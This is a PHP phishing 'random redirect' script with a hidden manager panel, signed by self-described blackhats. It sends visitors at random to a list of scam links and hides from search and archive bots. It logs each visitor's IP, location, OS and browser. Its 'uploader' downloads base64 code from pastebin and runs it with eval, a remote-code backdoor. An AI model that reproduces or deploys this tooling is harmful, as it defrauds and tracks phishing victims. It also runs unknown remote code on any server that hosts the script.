<?php
/*
================ CWRandomRedirect V1.5 ================
Original script by : CW & Leo D
Thanks to : 
- N/A =))

V1.5.1
- Error Fixing

To access manager just put ?cmd=manager at the end
of your file url.
Ex : http://domain.com/directfile.php?cmd=manager

NOTE : READ BEFORE YOU USE! (WOCO'EN SEK YO REK :v)
lek gak ngerti gawio google translate ae

This a fucking script, that waste the time of stupid
people, like me. But maybe this a joke script for other
people like you.
=======================================================
*/
session_start();
$yey = date('Y');
$yey = date('Y');

# =================== Simple Bot Blocker by User Agent ===============
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler","Applebot","Twitterbot","PhantomJS","metauri","Python");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
       header("HTTP/1.0 404 Not Found");
        exit;
    }
}
# ==================== Bot Blocker End ================================

# ======== Random string start [Adapted from : GX40 Sender] =
# Make random string [In V1.5 this feature is not used, maybe will better in next version]
function RandNumber ($randstr){ $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
  $str = ''; 
  for ($i = 0; $i < $randstr; $i++ ) { $pos = rand(0, strlen($char)-1); 
    $str .= $char{$pos}; 
  } return $str; 
}
# ----------- function end
$cw1 = rand(5,10); $cw2 = rand(5,10); $cw3 = rand(5,10); $cw4 = rand(5,10); $cw5 = rand(5,10);
$cw6 = rand(5,10); $cw7 = rand(5,10); $cw8 = rand(5,10); $cw9 = rand(5,10); $cw10 = rand(5,10);
$cw11 = rand(5,10); $cw12 = rand(5,10); $cw13 = rand(5,10); $cw14 = rand(5,10); $cw15 = rand(5,10);
$cw16 = rand(5,10); $cw17 = rand(5,10); $cw18 = rand(5,10); $cw19 = rand(5,10); $cw20 = rand(5,10);
$cw21 = rand(5,10); $cw22 = rand(5,10); $cw23 = rand(5,10); $cw24 = rand(5,10); $cw25 = rand(5,10);
$cw26 = rand(5,10); $cw27 = rand(5,10); $cw28 = rand(5,10); $cw29 = rand(5,10); $cw30 = rand(5,10);
#----------
$randomchar1 = RandNumber($cw1); $randomchar2 = RandNumber($cw2); $randomchar3 = RandNumber($cw3);
$randomchar4 = RandNumber($cw4); $randomchar5 = RandNumber($cw5); $randomchar6 = RandNumber($cw6);
$randomchar7 = RandNumber($cw7); $randomchar8 = RandNumber($cw8); $randomchar9 = RandNumber($cw9);
$randomchar10 = RandNumber($cw10); $randomchar11 = RandNumber($cw11); $randomchar12 = RandNumber($cw12);
$randomchar13 = RandNumber($cw13); $randomchar14 = RandNumber($cw14); $randomchar15 = RandNumber($cw15);
$randomchar16 = RandNumber($cw16); $randomchar17 = RandNumber($cw17); $randomchar18 = RandNumber($cw18);
$randomchar19 = RandNumber($cw19); $randomchar20 = RandNumber($cw20); $randomchar21 = RandNumber($cw21);
$randomchar22 = RandNumber($cw22); $randomchar23 = RandNumber($cw23); $randomchar24 = RandNumber($cw24);
$randomchar25 = RandNumber($cw25); $randomchar26 = RandNumber($cw26); $randomchar27 = RandNumber($cw27);
$randomchar28 = RandNumber($cw28); $randomchar29 = RandNumber($cw29); $randomchar30 = RandNumber($cw30);
# ================== Random String End ====================


# ===================== OS Detect Function Start [From scampage] ====================
function os_info($uagent) {
  // the order of this array is important
  global $uagent;
  $oses   = array(
    'Win311' => 'Win16',
    'Win95' => '(Windows 95)|(Win95)|(Windows_95)',
    'WinME' => '(Windows 98)|(Win 9x 4.90)|(Windows ME)',
    'Win98' => '(Windows 98)|(Win98)',
    'Win2000' => '(Windows NT 5.0)|(Windows 2000)',
    'WinXP' => '(Windows NT 5.1)|(Windows XP)',
    'WinServer2003' => '(Windows NT 5.2)',
    'WinVista' => '(Windows NT 6.0)',
    'Windows 7' => '(Windows NT 6.1)',
    'Windows 8' => '(Windows NT 6.2)',
    'WinNT' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
    'OpenBSD' => 'OpenBSD',
    'SunOS' => 'SunOS',
    'Ubuntu' => 'Ubuntu',
    'Android' => 'Android',
    'Linux' => '(Linux)|(X11)',
    'iPhone' => 'iPhone',
    'iPad' => 'iPad',
    'MacOS' => '(Mac_PowerPC)|(Macintosh)',
    'QNX' => 'QNX',
    'BeOS' => 'BeOS',
    'OS2' => 'OS/2',
    'SearchBot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(MSNBot)|(Ask Jeeves/Teoma)|(ia_archiver)'
  );
  $uagent = strtolower($uagent ? $uagent : $_SERVER['HTTP_USER_AGENT']);
  foreach($oses as $os => $pattern)
    if(preg_match('/' . $pattern . '/i', $uagent))
      return $os;
  return 'Unknown';
}
# ========================= END =============================

# =============== Get Browser Function start [From scampage]==================
function browsername() {
  $browserName = $_SERVER['HTTP_USER_AGENT'];
  if(strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/")) {
    $browserName = "Opera";
  } elseif(strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "chrome/")) {
    $browserName = "Chrome";
  } elseif(strpos(strtolower($browserName), "msie")) {
    $browserName = "Internet Explorer";
  } elseif(strpos(strtolower($browserName), "firefox/")) {
    $browserName = "Firefox";
  } elseif(strpos(strtolower($browserName), "safari/") and strpos(strtolower($browserName), "opr/") == false and strpos(strtolower($browserName), "chrome/") ==
false) {
    $browserName = "Safari";
  } else {
    $browserName = "Unknown";
  }
  return $browserName;
}
#============= Get Browser End ==============================

#===================== [First From scampage] ==============
# Double IP Lookup
# Menggunakan double lookup untuk mengantisipasi jika salah satu
# ip lookup mengalami error
function systemInfo($ipAddress) {
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, 'http://extreme-ip-lookup.com/json/'.$ipAddress);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
  $content = curl_exec($curl);
  curl_close($curl);
  $details = json_decode($content);
# ============= double IP check [Gixst3r] =============
  $curl2 = curl_init();
  curl_setopt($curl2, CURLOPT_URL, 'http://ip-api.com/json/'.$ipAddress);
  curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl2, CURLOPT_FOLLOWLOCATION, true);
  $content2 = curl_exec($curl2);
  curl_close($curl2);
  $details2 = json_decode($content2);
#=================== Array Start ==================
  $systemInfo = array();
  # ======= Get Country Code =======
  if($details->countryCode == ""){
    $systemInfo['kode_negara'] = $details2->countryCode;
  }else{
    $systemInfo['kode_negara'] = $details->countryCode;
  }
  # ======= Get Country =======
  if($details->country == ""){
    $systemInfo['country'] = $details2->country;
  } else {
    $systemInfo['country'] = $details->country;
  }
  # ======= Get Region / State =======
  if($details->region == ""){
    $systemInfo['region'] = $details2->regionName;
  } else {
    $systemInfo['region'] = $details->region;
  }
  # ======= Get  City =======
  if($details->city == ""){
    $systemInfo['city'] = $details2->city;
  } else {
    $systemInfo['city'] = $details->city;
  }
  # ======= Get Organization Name =======
  if($details->org == ""){
    $systemInfo['org'] = $details2->org;
  } else {
    $systemInfo['org'] = $details->org;
  }

  $systemInfo['hostname'] = $details->ipName; # get hostname
  $systemInfo['useragent'] = $_SERVER['HTTP_USER_AGENT']; # get user agent
  $systemInfo['os'] = os_info($systemInfo['useragent']); # get os 
  $systemInfo['browser'] = browsername(); # get browser
  return $systemInfo;
}

# =============================================== Manager start
if (isset($_GET['cmd'])) {
  # Terdapat beberapa variabel seperti
  # - manager : adalah menu utama
  # - documentation : halaman dokumentasi, berisi keterangan tentang redirect ini
  # - scamlist : halaman untuk mengubah, menambah, menghapus daftar scam
  # - visitor : disini bisa melihat berapa visitor (clicker) yang masuk
  # - htaccess : untuk membuat file htaccess (blocker)
  # - uploader : gunakan dengan bijak saja, jangan lalu dipasang log dan kemudian di sebar ya (pencemaran nama baik nanti wkwk)
  # =============================================== To access redirect manager
  echo '
<style type="text/css">
a{
  text-decoration:none
}
a:visited{
  color:blue
}
body{
  font-family:Consolas;
  background: #eee;
  font-size:14px
}

.butn_x{
  background-color: #eee;
  color: #666;
  border: 2px solid #bdbdbd;
  border-radius:5px;
  padding: 5px 20px;
  margin:2px;
  text-align: center;
  text-decoration: none;
}

.butn_x:hover{
  background-color: #bdbdbd;
  color: #eee;
}

#wrap_x{
  padding:2px;
  background:#F5F5F5;
  height:25%;
  width: 45%;
  border:solid 2px;
  border-radius:5px;
  border-color: #bdbdbd;
}

.g_raph{
  margin:auto;
  height:75%;
  width: 90%;
}

#wrap_v{
  padding:2px;
  background:#F5F5F5;
  height:100%;
  width: 100%;
  border:solid 2px;
  border-radius:5px;
  border-color: #bdbdbd;
}

#wrap_d{
  margin:auto;
  padding:2px;
  background:#F5F5F5;
  height:80%;
  border:solid 2px;
  border-radius:5px;
  border-color: #bdbdbd;
}

.scl_area{
  font-family:Consolas;
  resize: none;
  height:100%;
  width: 100%;
  background: #F5F5F5;
  border:none;
  border-radius:5px;
}

.scl_area:focus{
  outline: none !important;
}

.vis_area{
  #float: left;
  height:100%;
  width: 100%;
  background: #F5F5F5;
  overflow-y: scroll;
}

.gixs{
  min-height: 450px;
}

#scrollbar::-webkit-scrollbar-track{
  #-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
  border-radius: 10px;
  background-color: #F5F5F5;
}

#scrollbar::-webkit-scrollbar{
  width: 7px;
  background-color: #F5F5F5;
}

#scrollbar::-webkit-scrollbar-thumb{
  border-radius: 10px;
  background-color: #bdbdbd;
}
</style>';
#----------------------------------------------------------------------------------------------------------------
  # ================================================ Manager
  if($_GET['cmd'] == "manager"){
      echo '
      <title>[Gixst3r] Redirect Manager</title>
      <center><font style="font-size:30px;font-family:Consolas">[Gixst3r] Redirect Manager</font>
      <br>
      <font style="font-size:10px;">Copyright &copy; Gixster '.$yey.'</font></center><hr>
      <b>[MENU]</b><br>
      [+] <a href=?cmd=scamlist>Scampage List</a><br>
      [+] <a href=?cmd=visitor>View Visitor</a><br>
      [+] <a href=?cmd=htaccess>Create .htaccess file</a><br>
      [+] <a href=?cmd=uploader>Access Uploader</a><br>
      [+] <a href=?cmd=documentation>Documentation</a><font color=red>*Read carefully before you use this redirect</font>
      ';
  }
#----------------------------------------------------------------------------------------------------------------
  #================================================ Edit Scam List
  if($_GET['cmd'] == "scamlist"){
    echo '
    <title>[Gixst3r] Scam List</title>
    <a href=?cmd=manager> ../Back to manager </a><br>
    <center><font style="font-size:30px;font-family:Consolas">[Gixst3r] Scam List</font>
    <br>
    <font style="font-size:10px;">Copyright &copy; Gixster '.$yey.'</font><br>
    <hr>';
    # Reference : http://www.dynamicdrive.com/forums/showthread.php?4539-how-do-i-modify-existing-txt-files-with-php#9
    echo "
    <form action=\"".$PHP_SELF."\" method=\"post\">
    <div id=\"wrap_x\">
      <textarea class=\"scl_area\" name=\"scamlist_a\" id=\"scrollbar\" placeholder=\"Format : http://scamlink.com (separate by new line)\" >";
      # Menentukan jika file list ada atau tidak, empty atau tidak
      if(!file_exists("scamlist.txt")){
        $msg_ix = "<font color=\"red\">List Empty!</font>";
      } else {
        $j3mbut = file("scamlist.txt");
        if(empty($j3mbut)){
          $msg_ix = "<font color=\"red\">List Empty!</font>";
        }
      }
      # Menjalankan perintah update ketika tombol update di klik
      if($_POST['update_bt']){
        $open = fopen("scamlist.txt","w+");
        $text = $_POST['scamlist_a'];
        fwrite($open, $text);
        fclose($open);
        echo $text;
        $msg_ix = "<font color=\"green\">List Updated!</font>";
      } else{
        if(!file_exists("scamlist.txt")){
          $msg_ix = "<font color=\"red\">List Empty!</font>";
        } else {
          $j3mbut = file("scamlist.txt");
          if(empty($j3mbut)){
            $msg_ix = "<font color=\"red\">List Empty!</font>";
          }
          foreach($j3mbut as $sc) {
            echo $sc;
          }
        }
      }
    echo "</textarea></div>
      <input class=\"butn_x\" name=\"update_bt\" type=\"submit\" value=\"Update\" />\n
    </form>";
    echo $msg_ix."</center>";
  }
  
#----------------------------------------------------------------------------------------------------------------
  # =============================================== Documentation Page
  if($_GET['cmd'] == "documentation"){
    $cul = curl_init();
    curl_setopt($cul, CURLOPT_URL, 'https://pastebin.com/raw/vJfnTGCJ');
    curl_setopt($cul, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($cul, CURLOPT_FOLLOWLOCATION, true);
    $cull = curl_exec($cul);
    curl_close($cul);
      echo '
      <title>[Gixst3r] Documentation</title>
      <a href=?cmd=manager> ../Back to manager </a><br>
      <center><font style="font-size:30px;font-family:Consolas">[Gixst3r] Documentation</font>
      <br>
    <font style="font-size:10px;">Copyright &copy; Gixster '.$yey.'</font></center><br>
      <hr>
      <div id="wrap_d">
      <div class="vis_area" id="scrollbar">
  <div class="gixs">'.$cull.'</div></div></div>';
  }
#----------------------------------------------------------------------------------------------------------------
  # =============================================== To create .htaccess file
  if($_GET['cmd'] == "htaccess"){
      echo '
      <title>[Gixst3r] Create .htaccess</title>
      <a href=?cmd=manager> ../Back to manager </a><br>
      <center><font style="font-size:30px;font-family:Consolas">[Gixst3r] Create .htaccess</font>
      <br>
      <font style="font-size:10px;">Copyright &copy; Gixster '.$yey.'</font></center><br>
      ';
      $cul = curl_init();
    curl_setopt($cul, CURLOPT_URL, 'https://pastebin.com/raw/WLuzn04G');
    curl_setopt($cul, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($cul, CURLOPT_FOLLOWLOCATION, true);
    $cull = curl_exec($cul);
    curl_close($cul);
    
      $htac = ".htaccess";
    if(file_exists($htac)){    
      echo '<center><br><br><font color=red><h3>File Already Exist!';
      } else {
        $fp         = fopen($htac, "a");
      fputs($fp, $cull);
      fclose($fp);
      echo '<center><br><br><font color=green><h3>.htaccess Successfuly created';
      session_destroy();
      }
  }
#----------------------------------------------------------------------------------------------------------------
  # =============================================== To access file uploader
  if($_GET['cmd'] == "uploader"){
    echo '<a href=?cmd=manager> ../Back to manager </a>';
    $cul = curl_init();
    curl_setopt($cul, CURLOPT_URL, 'https://pastebin.com/raw/pWbXeD00');
    curl_setopt($cul, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($cul, CURLOPT_FOLLOWLOCATION, true);
    $cull = curl_exec($cul);
    curl_close($cul);
    eval(base64_decode($cull));
  }
#----------------------------------------------------------------------------------------------------------------
  # =============================================== To view your redirect visitor
  if($_GET['cmd'] == "visitor"){
        echo "
        <title>[Gixst3r] Visitor Log</title>
        <a href=?cmd=manager> ../Back to manager </a><br>
        <center><font style='font-size:30px;font-family:Consolas'>[Gixst3r] Visitor Log</font>
      <br>
    <font style='font-size:10px;'>Copyright &copy; Gixster ".$yey."</font></center><hr>
    <div class='g_raph'>
    <form action='".$PHP_SELF."'' method='post'>
    <input class=\"butn_x\" name=\"clear_v\" type=\"submit\" value=\"Clear Visitor\" />
        ";
    $file = "visitor.txt" ;
    if(file_exists($file)){    
      $fp         = fopen($file, "r");
      #$linecount = 0;
      while(!feof($fp)) {
          $sek = fgets($fp) . "<br>";
          $linecount++;
        }
        $total = $linecount - 1;
        if($_POST['clear_v']){
          $open = fopen("visitor.txt","w+");
          $text = '';
          fwrite($open, $text);
          fclose($open);
          echo '<font color=\'green\'>Cleared!</font>';
          $total = 0;
        }
        echo '
        </form>
        You have : <b><font color="red">'.$total.'</font></b> visitor from :
        <div id="wrap_v">
        <div class="vis_area" id="scrollbar">
        <div class="gixs">
        ';
        fclose($fp);
        $fp         = fopen("visitor.txt", "r");
        while(!feof($fp)) {
          $liat = fgets($fp) ;
          #echo $liat;
          $ex = explode("=>", $liat);
          $exo = explode('-', $ex[1]); #exo
          echo "<b><font color='red'>".$exo[0]."</font></b>  ".$exo[1]."  <b><font color='blue'>".$exo[2]."</font></b>  ".$exo[3]."<br>";
        }
        echo '</div></div></div></div>';
        fclose($fp);
      } else {
        echo "<br><font color=red>You don't have any visitor, or visitor file isn't exists, please wait until you have at least 1 visitor</font>";
      }
    }
} else {
  date_default_timezone_set('Asia/Jakarta');
  $v_ip  = $_SERVER['REMOTE_ADDR'];
  $systemInfo = systemInfo($v_ip);
  if(!empty($systemInfo['country'])){
    $v_country = $systemInfo['country'];
  } else {
    $v_country = "Unknown Country";
  }
  $sec_ip = md5($v_ip);
  $v_date     = date("d F H:i:s");
  $v_agent    = $_SERVER['HTTP_USER_AGENT'];
  $sigen = os_info($v_agent);
  $broser = browsername();
  if(!isset($_GET['ID'])) {
    echo "Invalid Session ID!";
    $fis         = fopen("kepo.txt", "a");
    fputs($fis, "=> $v_country - $v_ip - $sigen - $broser \r\n");
    fclose($fis);
  } else {
    $fp         = fopen("visitor.txt", "a");
    fputs($fp, "=> $v_country - $v_ip - $sigen - $broser \r\n");
    fclose($fp);
    # Gixst3r_Random_Redirect_1.5
    #--------------------
    /*$ls = array(            // this used before Version 1.5
      'https://google.com',   // in Version 1.5 isn't used.
      'https://yahoo.com'     // replaced with scam manager
    );*/
    #--------------------
    if(file_exists("scamlist.txt")){
      $slx = file("scamlist.txt");
      if(!empty($slx)){
        $ls = $slx;
      } else {
        $ls = array("https://your_scam_link_is_not_provided.bitch","https://your_scam_link_is_not_provided.lol");
      }
    } else {
      $ls = array("https://your_scam_link_is_not_provided.bitch","https://your_scam_link_is_not_provided.lol");
    }
    $ac = count($ls) - 1;
    $rd = rand(0,$ac);
    $rda = $ls[$rd];
    header("location:".$rda); 
  }
}
#-------------------------------------------------
#  Maaf jika masih kurang sempurna
#  Silakan edit, tambahkan, ganti apapun, disempurnakan sekiranya
#  itu bisa lebih baik, tapi tolong biarkan copyright tetap ada :D
# 
#-------------------------------------------------
#
#  Salam Blackhat
#
#  CW
?>
<!-- SEKIAN -->